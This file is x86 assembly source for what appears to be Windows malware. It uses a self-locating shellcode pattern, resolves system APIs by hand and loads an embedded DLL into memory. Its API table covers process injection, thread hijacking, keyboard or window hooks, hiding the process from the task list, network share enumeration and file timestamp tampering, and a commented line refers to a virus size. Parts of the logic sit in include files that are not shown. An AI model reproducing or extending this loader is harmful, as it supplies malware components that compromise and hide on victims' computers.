.586
locals 
jumps
.model flat, stdcall

callW macro f
extrn f:proc
	call f
endm

include windows.inc
include consts.inc
include pestruct.inc
include eaxapi1.inc ;definitions of macro

.data
start:

	lea eax, [_start]
	push esp esp 0 0 eax 10000h 0
	callW CreateThread
	pop ecx

	
_exit:
	push 30000
	callW Sleep
	push 0
	callW ExitProcess


_start:
	call recalc
recalc:
rec	db 5Dh ; pop ebp

	call get_kernel
	push kernel32_api_num
	pop ecx
__Kernel32 equ _LoadLibraryA-5
	lea esi, [ebp+__Kernel32-rec]
	call get_apis ; get kernel32 apis

	apiaddr GetProcAddress, rec
	push eax
	apiaddr LoadLibraryA, rec
	push eax
	apiaddr VirtualFree, rec
	push eax
	apiaddr VirtualProtect, rec
	push eax
	apiaddr VirtualAlloc, rec
	push eax
	lea eax, [ebp+kkldll-rec]
	push eax
	call dllload
	add esp, 6*4


	push -1
	xcall ExitThread


max	equ 2000
mutexname	db "ZMX",0		; mutex name
hmutex	dd 0


include eaxapi2.inc


kernel32_api_num	equ 70
declfunc	LoadLibraryA
declfunc 	OpenProcess
declfunc 	GetVersion
declfunc 	GetCurrentThread
declfunc 	SetThreadPriority
declfunc	CreateToolhelp32Snapshot
declfunc	Module32First
declfunc	Module32Next
declfunc	GetCurrentProcessId
declfunc	GetCurrentProcess
declfunc	CreateFileMappingA
declfunc	MapViewOfFile
declfunc	UnmapViewOfFile
declfunc	CloseHandle
declfunc	VirtualAlloc
declfunc	VirtualFree
declfunc	GlobalAlloc
declfunc	GlobalFree
declfunc	CreateThread
declfunc	CreateEventA
declfunc	ReadProcessMemory
declfunc	WriteProcessMemory
declfunc	VirtualProtectEx
declfunc	GetModuleHandleA
declfunc	DuplicateHandle
declfunc	ExitThread
declfunc	Sleep
declfunc	ExitProcess
declfunc	ReleaseMutex
declfunc	OpenMutex
declfunc	CreateMutex
declfunc	CreateFileA
declfunc	CreateProcessA
declfunc	CreateProcessW
declfunc	WaitForDebugEvent
declfunc	WaitForSingleObject
declfunc	ContinueDebugEvent
declfunc	TerminateProcess
declfunc	SetCurrentDirectoryA
declfunc	GetCurrentDirectoryA
declfunc	FindFirstFileA
declfunc	FindNextFileA
declfunc	FindClose
declfunc	GetWindowsDirectoryA
declfunc	GetSystemDirectoryA
declfunc	lstrcmpiA
declfunc	SetThreadContext
declfunc	GetThreadContext
declfunc	SuspendThread
declfunc	AllocConsole
declfunc	VirtualProtect
declfunc	ResumeThread
declfunc	TerminateThread
declfunc	GetFileSize
declfunc	PulseEvent
declfunc	SetEvent
declfunc	CopyFileA
declfunc	DeleteFileA
declfunc	GetThreadSelectorEntry
declfunc	WriteFile
declfunc	GetStdHandle
declfunc	GetLocalTime
declfunc	SetConsoleTitleA
declfunc	RegisterServiceProcess
declfunc	Beep
declfunc 	GetLocaleInfoA
declfunc	SetFileTime
declfunc	CreateDirectoryA
declfunc	RemoveDirectoryA
declfunc	GetProcAddress

_user32	db "user32",0
user32_api_num	equ 20
declfunc	MessageBoxA
declfunc	SetWindowsHookEx
declfunc	UnhookWindowsHookEx
declfunc	CallNextHookEx
declfunc	SendMessageA
declfunc	GetWindowThreadProcessId
declfunc	FindWindowA
declfunc	CreateWindowExA
declfunc	CreateWindowExW
declfunc	MessageBoxExA
declfunc	MessageBoxExW
declfunc	MessageBoxW
declfunc	DialogBoxParamA
declfunc	DialogBoxParamW
declfunc	DialogBoxIndirectParamA
declfunc	DialogBoxIndirectParamW
declfunc	CreateDialogParamA
declfunc	CreateDialogParamW
declfunc	GetWindow
declfunc	GetForegroundWindow

_psapi	db "psapi",0
psapi_api_num	equ 1
declfunc	EnumProcessModules

_mpr	db "mpr",0
mpr_api_num	equ 3
declfunc	WNetOpenEnumA
declfunc	WNetCloseEnum
declfunc	WNetEnumResourceA

kkldll:
include kkldll.inc
include dllload.inc

;_inj_code_size	equ $-thread2
;stacksize 	equ $-thread2 ;$-start
;virsize	equ $-_start+10h
end start
ends
